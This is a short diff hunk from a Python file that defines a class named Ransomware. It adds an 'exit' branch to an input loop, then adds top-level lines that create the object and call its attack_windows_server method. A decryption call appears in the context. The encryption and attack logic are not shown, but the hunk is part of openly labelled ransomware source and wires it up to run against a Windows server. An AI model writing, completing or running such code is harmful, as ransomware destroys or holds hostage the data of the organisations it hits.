@@ -85,5 +85,8 @@ class Ransomware:
                 # Decryption
                 self.decrypt_file()
 
-            elif user_input.lower() == "
+            elif user_input.lower() == "exit":
+                break
 
+ransomware = Ransomware()
+ransomware.attack_windows_server()
